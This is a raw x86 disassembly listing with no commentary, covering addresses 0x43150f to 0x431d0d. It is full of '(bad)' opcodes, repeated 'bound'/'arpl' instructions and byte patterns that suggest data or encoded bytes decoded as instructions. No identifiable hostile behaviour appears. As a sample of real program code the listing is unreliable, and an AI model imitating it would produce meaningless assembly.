  43150f:	bound  esp,QWORD PTR [edx+0x62]
  431512:	lock jmp edx
  431515:	xchg   edx,eax
  431516:	bound  esp,QWORD PTR [edx+0x62]
  431519:	push   eax
  43151a:	jmp    edx
  43151c:	mov    DWORD PTR [edx+0x62],esp
  43151f:	bound  edx,QWORD PTR [esi]
  431521:	jmp    edx
  431523:	mov    BYTE PTR [edx+0x62],ah
  431526:	(bad)  
  431527:	out    dx,al
  431528:	jmp    edx
  43152a:	(bad)  
  43152b:	bound  esp,QWORD PTR [edx+0x62]
  43152e:	ss jmp edx
  431531:	jle    0x431595
  431533:	bound  esp,QWORD PTR [edx+0x2a]
  431536:	jmp    edx
  431538:	imul   esp,DWORD PTR [edx+0x62],0x62
  43153c:	loopne 0x43153d
  43153e:	loop   0x4314e6
  431540:	bound  esp,QWORD PTR [edx+0x62]
  431543:	and    bh,bh
  431545:	loop   0x43157a
  431547:	bound  esp,QWORD PTR [edx+0x62]
  43154a:	repz jmp edx
  43154d:	xor    ah,BYTE PTR [edx+0x62]
  431550:	bound  edx,QWORD PTR [edi+edi*8]
  431553:	loop   0x43158e
  431555:	bound  esp,QWORD PTR [edx+0x62]
  431558:	xor    eax,0x6272e2ff
  43155d:	bound  esp,QWORD PTR [edx+0x3e]
  431560:	jmp    edx
  431562:	test   eax,0xf0626262
  431567:	jmp    edx
  431569:	test   al,0x62
  43156b:	bound  esp,QWORD PTR [edx+0x2a]
  43156e:	jmp    edx
  431570:	scas   eax,DWORD PTR es:[edi]
  431571:	bound  esp,QWORD PTR [edx+0x62]
  431574:	ret    0xe2ff
  431577:	sahf   
  431578:	bound  esp,QWORD PTR [edx+0x62]
  43157b:	out    dx,al
  43157c:	jmp    edx
  43157e:	test   DWORD PTR [edx+0x62],esp
  431581:	bound  esi,QWORD PTR ds:0x6284e2ff
  431587:	bound  esp,QWORD PTR [edx+0x3e]
  43158a:	jmp    edx
  43158c:	stos   DWORD PTR es:[edi],eax
  43158d:	bound  esp,QWORD PTR [edx+0x62]
  431590:	hlt    
  431591:	jmp    edx
  431593:	stos   BYTE PTR es:[edi],al
  431594:	bound  esp,QWORD PTR [edx+0x62]
  431597:	in     eax,dx
  431598:	jmp    edx
  43159a:	mov    eax,ds:0x16626262
  43159f:	jmp    edx
  4315a1:	mov    al,ds:0x42626262
  4315a6:	jmp    edx
  4315a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4315a9:	bound  esp,QWORD PTR [edx+0x62]
  4315ac:	lock jmp edx
  4315af:	xchg   esi,eax
  4315b0:	bound  esp,QWORD PTR [edx+0x62]
  4315b3:	ss jmp edx
  4315b6:	popf   
  4315b7:	bound  esp,QWORD PTR [edx+0x62]
  4315ba:	push   eax
  4315bb:	jmp    edx
  4315bd:	pushf  
  4315be:	bound  esp,QWORD PTR [edx+0x62]
  4315c1:	sub    bh,bh
  4315c3:	loop   0x431568
  4315c5:	bound  esp,QWORD PTR [edx+0x62]
  4315c8:	loopne 0x4315c9
  4315ca:	loop   0x431556
  4315cc:	bound  esp,QWORD PTR [edx+0x62]
  4315cf:	and    bh,bh
  4315d1:	loop   0x431554
  4315d3:	bound  esp,QWORD PTR [edx+0x62]
  4315d6:	repz jmp edx
  4315d9:	and    BYTE PTR [edx+0x62],0x62
  4315dd:	adc    al,0xff
  4315df:	loop   0x431568
  4315e1:	bound  esp,QWORD PTR [edx+0x62]
  4315e4:	xor    eax,0x6276e2ff
  4315e9:	bound  esp,QWORD PTR [edx+0x3e]
  4315ec:	jmp    edx
  4315ee:	jge    0x431652
  4315f0:	bound  esp,QWORD PTR [edx-0x10]
  4315f3:	jmp    edx
  4315f5:	jl     0x431659
  4315f7:	bound  esp,QWORD PTR [edx+0x2a]
  4315fa:	jmp    edx
  4315fc:	and    DWORD PTR [edx+0x62],0x62
  431600:	ret    0xe2ff
  431603:	sti    
  431604:	bound  esp,QWORD PTR [edx+0x62]
  431607:	out    dx,al
  431608:	jmp    edx
  43160a:	jns    0x43166e
  43160c:	bound  esp,QWORD PTR [edx+0x35]
  43160f:	jmp    edx
  431611:	js     0x431675
  431613:	bound  esp,QWORD PTR [edx+0x3e]
  431616:	jmp    edx
  431618:	jg     0x43167c
  43161a:	bound  esp,QWORD PTR [edx-0xc]
  43161d:	jmp    edx
  43161f:	mov    fs,WORD PTR [edx+0x62]
  431622:	(bad)  
  431623:	in     eax,dx
  431624:	jmp    edx
  431626:	aad    0x62
  431628:	bound  esp,QWORD PTR [edx+0x16]
  43162b:	jmp    edx
  43162d:	aam    0x62
  43162f:	bound  esp,QWORD PTR [edx+0x42]
  431632:	jmp    edx
  431634:	add    ah,BYTE PTR [edx+0x62]
  431637:	(bad)  
  431638:	lock jmp edx
  43163b:	cmp    BYTE PTR [edx+0x62],ah
  43163e:	bound  esi,QWORD PTR [esi]
  431640:	jmp    edx
  431642:	aaa    
  431643:	bound  esp,QWORD PTR [edx+0x62]
  431646:	push   eax
  431647:	jmp    edx
  431649:	bound  esp,QWORD PTR cs:[edx+0x62]
  43164d:	dec    esp
  43164e:	jmp    edx
  431650:	sub    eax,0xe0626262
  431655:	jmp    edx
  431657:	arpl   WORD PTR fs:[edx+0x62],sp
  43165b:	and    bh,bh
  43165d:	loop   0x43164b
  43165f:	arpl   WORD PTR [edx+0x62],sp
  431662:	repz jmp edx
  431665:	in     eax,dx
  431666:	arpl   WORD PTR [edx+0x62],sp
  431669:	adc    al,0xff
  43166b:	loop   0x431667
  43166d:	arpl   WORD PTR [edx+0x62],sp
  431670:	xor    eax,0x6331e2ff
  431675:	bound  esp,QWORD PTR [edx+0x3e]
  431678:	jmp    edx
  43167a:	outs   dx,DWORD PTR ds:[esi]
  43167b:	arpl   WORD PTR [edx+0x62],sp
  43167e:	lock jmp edx
  431681:	data16 arpl WORD PTR [edx+0x62],sp
  431685:	and    edi,edi
  431687:	loop   0x4316ee
  431689:	arpl   WORD PTR [edx+0x62],sp
  43168c:	sbb    bh,bh
  43168e:	loop   0x4316ed
  431690:	arpl   WORD PTR [edx+0x62],sp
  431693:	fs jmp edx
  431696:	inc    esp
  431697:	arpl   WORD PTR [edx+0x62],sp
  43169a:	inc    edx
  43169b:	jmp    edx
  43169d:	dec    ebx
  43169e:	arpl   WORD PTR [edx+0x62],sp
  4316a1:	lock jmp edx
  4316a4:	dec    edx
  4316a5:	arpl   WORD PTR [edx+0x62],sp
  4316a8:	sub    bh,bh
  4316aa:	loop   0x431715
  4316ac:	arpl   WORD PTR [edx+0x62],sp
  4316af:	loopne 0x431660
  4316b1:	sbb    al,0x13
  4316b3:	and    esi,DWORD PTR [eax]
  4316b5:	arpl   WORD PTR [edx+0x62],sp
  4316b8:	scas   al,BYTE PTR es:[edi]
  4316b9:	xchg   esp,eax
  4316ba:	scas   al,BYTE PTR es:[edi]
  4316bb:	mov    ebx,0x62a2e2ff
  4316c0:	bound  esp,QWORD PTR [edx+0x22]
  4316c3:	jmp    edx
  4316c5:	cdq    
  4316c6:	bound  esp,QWORD PTR [edx+0x62]
  4316c9:	repz jmp edx
  4316cc:	cwde   
  4316cd:	bound  esp,QWORD PTR [edx+0x62]
  4316d0:	adc    al,0xff
  4316d2:	loop   0x431673
  4316d4:	bound  esp,QWORD PTR [edx+0x62]
  4316d7:	xor    eax,0x622ce2ff
  4316dc:	bound  esp,QWORD PTR [edx+0x3e]
  4316df:	jmp    edx
  4316e1:	jne    0x431745
  4316e3:	bound  esp,QWORD PTR [edx-0x10]
  4316e6:	jmp    edx
  4316e8:	je     0x43174c
  4316ea:	bound  esp,QWORD PTR [edx+0x21]
  4316ed:	jmp    edx
  4316ef:	fwait
  4316f0:	bound  esp,QWORD PTR [edx+0x62]
  4316f3:	sbb    bh,bh
  4316f5:	loop   0x4316d1
  4316f7:	bound  esp,QWORD PTR [edx+0x62]
  4316fa:	fs jmp edx
  4316fd:	shl    DWORD PTR [edx+0x62],1
  431700:	bound  eax,QWORD PTR [edx-0x1]
  431703:	loop   0x4316d5
  431705:	bound  esp,QWORD PTR [edx+0x62]
  431708:	lock jmp edx
  43170b:	xlat   BYTE PTR ds:[ebx]
  43170c:	bound  esp,QWORD PTR [edx+0x62]
  43170f:	dec    esp
  431710:	jmp    edx
  431712:	(bad)  
  431713:	bound  esp,QWORD PTR [edx+0x62]
  431716:	loopne 0x4316c7
  431718:	sbb    al,0x13
  43171a:	and    ecx,ebp
  43171c:	bound  esp,QWORD PTR [edx+0x62]
  43171f:	scas   al,BYTE PTR es:[edi]
  431720:	xchg   esp,eax
  431721:	scas   al,BYTE PTR es:[edi]
  431722:	mov    ebx,0x63f35bd8
  431727:	bound  esp,QWORD PTR [edx+0x61]
  43172a:	fcomp  DWORD PTR [ebx+0x61]
  43172d:	bound  esp,QWORD PTR [edx+0x62]
  431730:	popa   
  431731:	bound  esi,QWORD PTR [edx+0x62617024]
  431737:	mov    dl,0x24
  431739:	or     eax,0xad622475
  43173e:	adc    al,0x68
  431740:	popa   
  431741:	popa   
  431742:	rep lods eax,DWORD PTR ds:[esi]
  431744:	jne    0x4317a7
  431746:	popa   
  431747:	ror    BYTE PTR ds:0xdb0d2475,cl
  43174d:	and    al,0x68
  43174f:	popa   
  431750:	popa   
  431751:	bound  esi,QWORD PTR [edx-0xd]
  431754:	aas    
  431755:	mov    ds:0xe2176161,eax
  43175a:	popa   
  43175b:	bound  esp,QWORD PTR [edx+0x62]
  43175e:	fsub   DWORD PTR [ebx]
  431760:	popa   
  431761:	bound  esp,QWORD PTR [edx+0x62]
  431764:	popa   
  431765:	mov    dl,0xa5
  431767:	jo     0x4317ca
  431769:	bound  esi,QWORD PTR [edx+0x24750d24]
  43176f:	bound  ebp,QWORD PTR [ebp+0x61616814]
  431775:	repz jmp 0x750d:0xd2616175
  43177d:	and    al,0xd
  43177f:	fisttp DWORD PTR [eax+0x68]
  431782:	popa   
  431783:	popa   
  431784:	(bad)
  431789:	popa   
  43178a:	bound  esp,QWORD PTR [edx+0x62]
  43178d:	fsub   DWORD PTR [ebx]
  43178f:	popa   
  431790:	bound  esp,QWORD PTR [edx+0x62]
  431793:	popa   
  431794:	mov    dl,0xd4
  431796:	jo     0x4317f9
  431798:	bound  esi,QWORD PTR [edx+0x24750d24]
  43179e:	bound  ebp,QWORD PTR [ebp+0x61616814]
  4317a4:	repz int3 
  4317a6:	jne    0x431809
  4317a8:	popa   
  4317a9:	ror    BYTE PTR ds:0xdb0d2475,cl
  4317af:	dec    eax
  4317b0:	push   0xd2626161
  4317b5:	xchg   edx,eax
  4317b6:	pop    ss
  4317b7:	loop   0x43181a
  4317b9:	bound  esp,QWORD PTR [edx+0x62]
  4317bc:	or     eax,0x62627ae2
  4317c1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4317c7:	xor    al,0x5e
  4317c9:	call   0x75ea7976
  4317ce:	std    
  4317cf:	xchg   ebx,eax
  4317d0:	outs   dx,BYTE PTR ds:[esi]
  4317d1:	mov    ds,WORD PTR [edi+0x61]
  4317d4:	popa   
  4317d5:	or     eax,0x130d6075
  4317da:	inc    eax
  4317db:	bound  esp,QWORD PTR [edx+0x62]
  4317de:	(bad)  
  4317df:	outs   dx,DWORD PTR ds:[esi]
  4317e0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4317e6:	pop    esi
  4317e7:	call   0xa5507994
  4317ec:	std    
  4317ed:	sub    eax,0x9322a74f
  4317f2:	mov    ah,0x5f
  4317f4:	pop    edi
  4317f5:	popa   
  4317f6:	popa   
  4317f7:	and    edx,esp
  4317f9:	sub    BYTE PTR [ebx+0x62],ah
  4317fc:	bound  esp,QWORD PTR [ecx+0x61]
  4317ff:	popa   
  431800:	popa   
  431801:	bound  esi,QWORD PTR [edx+0x62617024]
  431807:	mov    dl,0x24
  431809:	or     eax,0xad622475
  43180e:	or     BYTE PTR [eax+0x61],ch
  431811:	popa   
  431812:	repz dec eax
  431814:	sub    al,0x61
  431816:	popa   
  431817:	ror    BYTE PTR ds:0xdb0d2475,cl
  43181d:	and    al,0x68
  43181f:	popa   
  431820:	popa   
  431821:	bound  esi,QWORD PTR [edx-0xd]
  431824:	mov    DWORD PTR [ebx-0x32f29e9f],esp
  43182a:	and    al,0xd
  43182c:	pop    ss
  43182d:	add    DWORD PTR [eax+0x61],ebp
  431830:	popa   
  431831:	pop    ss
  431832:	push   0xb2626170
  431837:	and    al,0x13
  431839:	loop   0x4317c5
  43183b:	bound  esp,QWORD PTR [edx+0x62]
  43183e:	shl    bl,cl
  431840:	aam    0x75
  431842:	popa   
  431843:	popa   
  431844:	ror    BYTE PTR ds:0xdb0d2475,cl
  43184a:	add    DWORD PTR [eax+0x61],ebp
  43184d:	popa   
  43184e:	bound  esi,QWORD PTR [edx+0xd]
  431851:	jne    0x431877
  431853:	or     eax,0x616848db
  431858:	popa   
  431859:	(bad)  
  43185b:	call   0x6262:0x6348e217
  431862:	jo     0x4318c5
  431864:	bound  esi,QWORD PTR [edx-0x591decdc]
  43186a:	bound  esp,QWORD PTR [edx+0x62]
  43186d:	shl    bl,cl
  43186f:	dec    edx
  431870:	sub    al,0x61
  431872:	popa   
  431873:	ror    BYTE PTR ds:0xdb0d2475,cl
  431879:	add    DWORD PTR [eax+0x61],ebp
  43187c:	popa   
  43187d:	bound  esi,QWORD PTR [edx+0xd]
  431880:	jne    0x4318a6
  431882:	or     eax,0x616848db
  431887:	popa   
  431888:	(bad)  
  43188a:	call   0x6262:0x6350e217
  431891:	jo     0x4318f4
  431893:	bound  esi,QWORD PTR [edx+0x64e21324]
  431899:	arpl   WORD PTR [edx+0x62],sp
  43189c:	shl    bl,cl
  43189e:	pusha  
  43189f:	sub    al,0x61
  4318a1:	popa   
  4318a2:	ror    BYTE PTR ds:0xdb0d2475,cl
  4318a8:	add    DWORD PTR [eax+0x61],ebp
  4318ab:	popa   
  4318ac:	bound  esi,QWORD PTR [edx+0xd]
  4318af:	jne    0x4318d5
  4318b1:	or     eax,0x616848db
  4318b6:	popa   
  4318b7:	(bad)  
  4318b9:	call   0x6262:0x6318e217
  4318c0:	fcomp  DWORD PTR [ebx+0x3c]
  4318c3:	arpl   WORD PTR [edx+0x62],sp
  4318c6:	popa   
  4318c7:	fcomp  DWORD PTR [ebx+0x58]
  4318ca:	arpl   WORD PTR [edx+0x62],sp
  4318cd:	popa   
  4318ce:	out    dx,al
  4318cf:	lea    ecx,ds:0x626358e2
  4318d5:	bound  esp,QWORD PTR [edx+0x6358e217]
  4318db:	bound  esp,QWORD PTR [edx-0x28]
  4318de:	and    ebx,DWORD PTR [eax+0x63]
  4318e1:	bound  esp,QWORD PTR [edx-0x6e]
  4318e4:	jae    0x431959
  4318e6:	or     eax,0x626358e2
  4318eb:	bound  ebp,QWORD PTR [edi-0x3e658fba]
  4318f1:	dec    edx
  4318f2:	outs   dx,DWORD PTR ds:[esi]
  4318f3:	fsub   DWORD PTR [edx]
  4318f5:	test   eax,0x48e462c8
  4318fa:	arpl   WORD PTR [edx+0x62],sp
  4318fd:	loop   0x43191b
  4318ff:	out    0x87,eax
  431901:	or     eax,0x626358e2
  431906:	bound  ebp,QWORD PTR [edi-0x3e7e8fba]
  43190c:	dec    edx
  43190d:	outs   dx,DWORD PTR ds:[esi]
  43190e:	fsub   DWORD PTR [edx]
  431910:	cdq    
  431911:	enter  0xe462,0x18
  431915:	arpl   WORD PTR [edx+0x62],sp
  431918:	loop   0x431936
  43191a:	out    0x91,eax
  43191c:	fcomp  DWORD PTR [ebx+0x3c]
  43191f:	arpl   WORD PTR [edx+0x62],sp
  431922:	popa   
  431923:	out    dx,al
  431924:	cmp    DWORD PTR [eax+0x61],esi
  431927:	bound  esi,QWORD PTR [edx-0x791decdc]
  43192d:	bound  esp,QWORD PTR [edx+0x62]
  431930:	shl    bl,cl
  431932:	sahf   
  431933:	sub    al,0x61
  431935:	popa   
  431936:	ror    BYTE PTR ds:0xdb0d2475,cl
  43193c:	cmc    
  43193d:	push   0x72626161
  431942:	or     eax,0xdb0d2475
  431947:	dec    eax
  431948:	push   0xd2626161
  43194d:	call   0x6262:0x633ce217
  431954:	lock les esp,FWORD PTR [edx+0x62]
  431958:	bound  ecx,QWORD PTR ds:0x62627a0b
  43195e:	(bad)  
  43195f:	(bad)  
  431960:	dec    ebx
  431961:	or     ebx,DWORD PTR [edx-0x29c537]
  431967:	pop    esi
  431968:	call   0xe2507b15
  43196d:	inc    eax
  43196e:	bound  esp,QWORD PTR [edx+0x62]
  431971:	test   DWORD PTR [ebx],ecx
  431973:	call   0xa8e8:0x5e343ac9
  43197a:	popa   
  43197b:	shl    BYTE PTR [edx-0x4e],cl
  43197e:	and    al,0x13
  431980:	jne    0x43195d
  431982:	shl    bl,cl
  431984:	ss lahf 
  431986:	popa   
  431987:	popa   
  431988:	ror    BYTE PTR ds:0x62627ae2,cl
  43198e:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431994:	xor    al,0x5e
  431996:	call   0x63157b43
  43199b:	mov    dl,0x24
  43199d:	adc    esi,DWORD PTR [ebp+0x58]
  4319a0:	shl    bl,cl
  4319a2:	stc    
  4319a3:	lahf   
  4319a4:	popa   
  4319a5:	popa   
  4319a6:	shl    BYTE PTR [edx-0x1c],cl
  4319a9:	cmp    al,0x63
  4319ab:	bound  esp,QWORD PTR [edx-0x59]
  4319ae:	xor    DWORD PTR [edx+0x28e22190],esi
  4319b4:	arpl   WORD PTR [edx+0x62],sp
  4319b7:	push   0xd616161
  4319bc:	loop   0x4319fe
  4319be:	bound  esp,QWORD PTR [edx+0x62]
  4319c1:	test   DWORD PTR [ebx],ecx
  4319c3:	call   0x1360:0xcd0d3ac9
  4319ca:	outs   dx,BYTE PTR ds:[esi]
  4319cb:	push   0x61a8e85e
  4319d0:	pop    ss
  4319d1:	jne    0x431a33
  4319d3:	fsub   DWORD PTR [ebx]
  4319d5:	sub    BYTE PTR [ebx+0x62],ah
  4319d8:	bound  esp,QWORD PTR [ecx-0x19]
  4319db:	mov    cl,BYTE PTR ds:0x626240e2
  4319e1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4319e7:	or     eax,0x6e1354cd
  4319ec:	push   0x61a8e85e
  4319f1:	pop    ss
  4319f2:	jne    0x431a48
  4319f4:	lock cmp al,0x5c
  4319f7:	bound  esp,QWORD PTR [edx+0xd]
  4319fa:	jne    0x431a5c
  4319fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4319fd:	jne    0x431a53
  4319ff:	mov    dl,0x81
  431a01:	jp     0x4319b0
  431a03:	loop   0x431a06
  431a05:	imul   esp,DWORD PTR [edx-0x4e],0x5d751324
  431a0c:	shl    bl,cl
  431a0e:	cdq    
  431a0f:	jbe    0x431a72
  431a11:	popa   
  431a12:	pop    ss
  431a13:	loop   0x4319e3
  431a15:	bound  esp,QWORD PTR [edx+0x62]
  431a18:	out    dx,al
  431a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431a1a:	or     eax,0x6262cee2
  431a1f:	bound  edx,QWORD PTR [edi]
  431a21:	loop   0x431a1c
  431a23:	pop    esp
  431a24:	bound  esp,QWORD PTR [edx+0xd]
  431a27:	loop   0x431a69
  431a29:	bound  esp,QWORD PTR [edx+0x62]
  431a2c:	test   DWORD PTR [ebx],ecx
  431a2e:	call   0xa8e8:0x5e343ac9
  431a35:	popa   
  431a36:	or     eax,0x625cf913
  431a3b:	bound  ebp,QWORD PTR [edi-0x6ecf298]
  431a41:	pop    esp
  431a42:	bound  esp,QWORD PTR [edx+0x17]
  431a45:	push   0x627ae20d
  431a4a:	bound  esp,QWORD PTR [edx-0x7b]
  431a4d:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431a53:	call   0xe2ea7c00
  431a58:	into   
  431a59:	bound  esp,QWORD PTR [edx+0x62]
  431a5c:	xchg   ebx,eax
  431a5d:	outs   dx,BYTE PTR ds:[esi]
  431a5e:	loope  0x4319ed
  431a60:	popa   
  431a61:	popa   
  431a62:	or     eax,0x62627ae2
  431a67:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431a6d:	xor    al,0x5e
  431a6f:	call   0x75ea7c1c
  431a74:	pop    ebp
  431a75:	xchg   ebx,eax
  431a76:	outs   dx,BYTE PTR ds:[esi]
  431a77:	mov    ecx,0xd61618d
  431a7c:	loop   0x431af8
  431a7e:	bound  esp,QWORD PTR [edx+0x62]
  431a81:	test   DWORD PTR [ebx],ecx
  431a83:	call   0xa8e8:0x5e343ac9
  431a8a:	popa   
  431a8b:	pop    ss
  431a8c:	loop   0x431a96
  431a8e:	arpl   WORD PTR [edx+0x62],sp
  431a91:	out    dx,al
  431a92:	jl     0x431aa1
  431a94:	loop   0x431ad6
  431a96:	bound  esp,QWORD PTR [edx+0x62]
  431a99:	test   DWORD PTR [ebx],ecx
  431a9b:	call   0x6308:0x130d3ac9
  431aa2:	bound  esp,QWORD PTR [edx+0x13]
  431aa5:	outs   dx,BYTE PTR ds:[esi]
  431aa6:	push   0x61a8e85e
  431aab:	pop    ss
  431aac:	loop   0x431ab6
  431aae:	arpl   WORD PTR [edx+0x62],sp
  431ab1:	or     eax,0xe2a15d75
  431ab6:	or     BYTE PTR [ebx+0x62],ah
  431ab9:	bound  esi,QWORD PTR [ebx-0x7b]
  431abc:	or     eax,0x6262cee2
  431ac1:	bound  edx,QWORD PTR [esi-0x1e]
  431ac4:	or     BYTE PTR [ebx+0x62],ah
  431ac7:	bound  edx,QWORD PTR [edi]
  431ac9:	loop   0x431ae7
  431acb:	pop    esp
  431acc:	bound  esp,QWORD PTR [edx+0xd]
  431acf:	loop   0x431ad9
  431ad1:	arpl   WORD PTR [edx+0x62],sp
  431ad4:	scas   eax,DWORD PTR es:[edi]
  431ad5:	inc    esi
  431ad6:	jo     0x431ad3
  431ad8:	ror    DWORD PTR [edx+0x6f],0x98
  431adc:	or     eax,0x625c1ce2
  431ae1:	bound  edx,QWORD PTR [ebx+0x222d6106]
  431ae7:	or     eax,0x625c1c13
  431aec:	bound  eax,QWORD PTR [eax+ebp*2]
  431aef:	out    dx,al
  431af0:	add    ecx,DWORD PTR ds:0xe2175d75
  431af6:	mov    fs,WORD PTR [ebx+0x62]
  431af9:	bound  ecx,QWORD PTR ds:0x6262cee2
  431aff:	bound  edx,QWORD PTR [edi]
  431b01:	loop   0x431b3b
  431b03:	arpl   WORD PTR [edx+0x62],sp
  431b06:	and    edx,esp
  431b08:	jmp    0x431b6d
  431b0a:	bound  esp,QWORD PTR [edx-0x53]
  431b0d:	loop   0x431b10
  431b0f:	imul   esp,DWORD PTR [ecx],0x6263e6e2
  431b15:	bound  esp,QWORD PTR ds:0xd6901e2
  431b1b:	loop   0x431b08
  431b1d:	arpl   WORD PTR [edx+0x62],sp
  431b20:	test   DWORD PTR [ebx],ecx
  431b22:	call   0xa8e8:0x5e343ac9
  431b29:	popa   
  431b2a:	pop    ss
  431b2b:	loop   0x431b0c
  431b2d:	arpl   WORD PTR [edx+0x62],sp
  431b30:	or     eax,0x6263ebe2
  431b35:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431b3b:	xor    al,0x5e
  431b3d:	call   0xe25a7cea
  431b42:	jecxz  0x431ba7
  431b44:	bound  esp,QWORD PTR [edx+0x21]
  431b47:	loop   0x431b30
  431b49:	arpl   WORD PTR [edx+0x62],sp
  431b4c:	or     al,0xe2
  431b4e:	add    DWORD PTR [ecx+0x21],ebp
  431b51:	loop   0x431bcd
  431b53:	arpl   WORD PTR [edx+0x62],sp
  431b56:	daa    
  431b57:	loop   0x431b5a
  431b59:	imul   ecx,DWORD PTR ds:0x62638ee2,0xeb130d62
  431b63:	arpl   WORD PTR [edx+0x62],sp
  431b66:	(bad)  
  431b67:	outs   dx,DWORD PTR ds:[esi]
  431b68:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431b6e:	pop    esi
  431b6f:	call   0x1fea7d1c
  431b74:	xchg   ebx,eax
  431b75:	outs   dx,BYTE PTR ds:[esi]
  431b76:	add    eax,0xd616156
  431b7b:	loop   0x431b63
  431b7d:	arpl   WORD PTR [edx+0x62],sp
  431b80:	test   DWORD PTR [ebx],ecx
  431b82:	call   0xa8e8:0x5e343ac9
  431b89:	popa   
  431b8a:	or     eax,0x6263df13
  431b8f:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  431b95:	out    0x63,al
  431b97:	bound  esp,QWORD PTR [edx-0x7b]
  431b9a:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431ba0:	call   0xe4507d4d
  431ba5:	mov    fs,WORD PTR [ebx+0x62]
  431ba8:	bound  ebp,QWORD PTR ds:0x934ea758
  431bae:	mov    ah,0xc0
  431bb0:	push   esi
  431bb1:	popa   
  431bb2:	popa   
  431bb3:	or     eax,0x62638ee2
  431bb8:	bound  ecx,QWORD PTR ds:0x6263df13
  431bbe:	bound  ebp,QWORD PTR ds:0xe7130d1f
  431bc4:	arpl   WORD PTR [edx+0x62],sp
  431bc7:	(bad)  
  431bc8:	outs   dx,DWORD PTR ds:[esi]
  431bc9:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431bcf:	pop    esi
  431bd0:	call   0x46f27d7d
  431bd5:	dec    edx
  431bd6:	outs   dx,DWORD PTR ds:[esi]
  431bd7:	pop    ss
  431bd8:	loop   0x431ba8
  431bda:	arpl   WORD PTR [edx+0x62],sp
  431bdd:	or     eax,0x6263cee2
  431be2:	bound  ecx,QWORD PTR ds:0x62637a13
  431be8:	(bad)  
  431be9:	(bad)  
  431bea:	outs   dx,DWORD PTR ds:[esi]
  431beb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431bf1:	pop    esi
  431bf2:	call   0x1fea7d9f
  431bf7:	lds    ebp,FWORD PTR [edx+0xd]
  431bfa:	loop   0x431c76
  431bfc:	arpl   WORD PTR [edx+0x62],sp
  431bff:	test   DWORD PTR [ebx],ecx
  431c01:	call   0xa8e8:0x5e343ac9
  431c08:	popa   
  431c09:	pop    ss
  431c0a:	loop   0x431bda
  431c0c:	arpl   WORD PTR [edx+0x62],sp
  431c0f:	or     eax,0x6263e7e2
  431c14:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431c1a:	xor    al,0x5e
  431c1c:	call   0x13507dc9
  431c21:	into   
  431c22:	arpl   WORD PTR [edx+0x62],sp
  431c25:	xchg   ebx,eax
  431c26:	mov    edx,0xe3131760
  431c2b:	arpl   WORD PTR [edx+0x62],sp
  431c2e:	or     eax,0x6263e3e2
  431c33:	bound  ecx,QWORD PTR ds:0x6263eb13
  431c39:	(bad)  
  431c3a:	(bad)  
  431c3b:	outs   dx,DWORD PTR ds:[esi]
  431c3c:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431c42:	pop    esi
  431c43:	call   0x1fea7df0
  431c48:	xchg   ebx,eax
  431c49:	outs   dx,BYTE PTR ds:[esi]
  431c4a:	add    DWORD PTR [edi+0x61],ebx
  431c4d:	popa   
  431c4e:	or     eax,0x6263e3e2
  431c53:	bound  edx,QWORD PTR [edi]
  431c55:	loop   0x431bfd
  431c57:	arpl   WORD PTR [edx+0x62],sp
  431c5a:	or     eax,0x626338e2
  431c5f:	bound  edx,QWORD PTR [esi-0x1e]
  431c62:	fbld   TBYTE PTR [ebx+0x62]
  431c65:	bound  edx,QWORD PTR [edi]
  431c67:	loop   0x431cdb
  431c69:	arpl   WORD PTR [edx+0x62],sp
  431c6c:	and    edx,esp
  431c6e:	sub    al,0x63
  431c70:	bound  esp,QWORD PTR [edx-0x53]
  431c73:	loop   0x431c76
  431c75:	imul   esp,DWORD PTR [ecx],0x626396e2
  431c7b:	bound  esp,QWORD PTR ds:0x216901e2
  431c81:	loop   0x431c55
  431c83:	arpl   WORD PTR [edx+0x62],sp
  431c86:	mov    bl,0xe2
  431c88:	add    DWORD PTR [ecx+0x21],ebp
  431c8b:	loop   0x431c4b
  431c8d:	arpl   WORD PTR [edx+0x62],sp
  431c90:	and    esp,edx
  431c92:	add    DWORD PTR [ecx+0x21],ebp
  431c95:	loop   0x431c61
  431c97:	arpl   WORD PTR [edx+0x62],sp
  431c9a:	and    eax,0xd6901e2
  431c9f:	loop   0x431ccd
  431ca1:	arpl   WORD PTR [edx+0x62],sp
  431ca4:	test   DWORD PTR [ebx],ecx
  431ca6:	call   0xa8e8:0x5e343ac9
  431cad:	popa   
  431cae:	pop    ss
  431caf:	loop   0x431c67
  431cb1:	arpl   WORD PTR [edx+0x62],sp
  431cb4:	adc    esp,edx
  431cb6:	fisub  DWORD PTR [ebx+0x62]
  431cb9:	bound  edx,QWORD PTR [edi]
  431cbb:	loop   0x431c5f
  431cbd:	arpl   WORD PTR [edx+0x62],sp
  431cc0:	adc    esp,edx
  431cc2:	inc    eax
  431cc3:	arpl   WORD PTR [edx+0x62],sp
  431cc6:	pop    ss
  431cc7:	loop   0x431c8f
  431cc9:	arpl   WORD PTR [edx+0x62],sp
  431ccc:	or     eax,0x6263a6e2
  431cd1:	bound  esp,QWORD PTR [edi+0x6263b6e2]
  431cd7:	bound  edx,QWORD PTR [ebx+0x6168bbd8]
  431cdd:	popa   
  431cde:	or     eax,0x6263a2e2
  431ce3:	bound  esp,QWORD PTR [ecx]
  431ce5:	popa   
  431ce6:	pop    ebx
  431ce7:	loop   0x431cea
  431ce9:	imul   ecx,DWORD PTR ds:0x6263c6e2,0xb7612162
  431cf3:	loop   0x431cf6
  431cf5:	imul   edx,DWORD PTR [ebx],0x6263a7e2
  431cfb:	bound  edx,QWORD PTR [edi]
  431cfd:	loop   0x431c9d
  431cff:	arpl   WORD PTR [edx+0x62],sp
  431d02:	or     eax,0x6263cae2
  431d07:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431d0d:	xor    al,0x5e
